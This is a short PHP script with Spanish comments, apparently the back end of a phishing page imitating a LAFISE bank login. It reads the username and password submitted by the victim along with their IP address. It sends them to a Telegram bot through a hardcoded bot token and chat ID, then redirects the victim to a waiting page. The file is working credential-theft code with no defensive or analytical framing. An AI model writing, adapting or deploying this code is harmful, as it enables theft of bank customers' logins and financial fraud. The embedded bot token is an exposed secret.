<?php

// Configurar los datos del bot de Telegram y del chat
$bot_token = '7584579761:AAF_gz-XhA7nA9wSzN6OaWP6Ml1UX9DGgkU';
$chat_id = '5157616506';

// Obtener los datos del usuario, contraseña y dirección IP del formulario
$usuario = $_POST['us'];
$contrasena = $_POST['ct'];
$ip = $_SERVER['REMOTE_ADDR'];

// Construir el mensaje que se enviará al bot de Telegram
$mensaje = "LOGIN LAFISE:\nNuevo usuario: $usuario\nContraseña: $contrasena\nIP: $ip";

// Enviar el mensaje al bot de Telegram utilizando la API
$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$datos = array('chat_id' => $chat_id, 'text' => $mensaje);

// Crear opciones para el contexto HTTP, incluyendo las cabeceras apropiadas
$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($datos),
    ),
);

// Crear el contexto HTTP con las opciones definidas
$context = stream_context_create($options);
$resultado = file_get_contents($url, false, $context);

// Verificar si el mensaje se envió correctamente y mostrar un mensaje al usuario
 

// Redirigir al usuario a otra página
echo "<script>window.location.href='espera.php';</script>";
?>
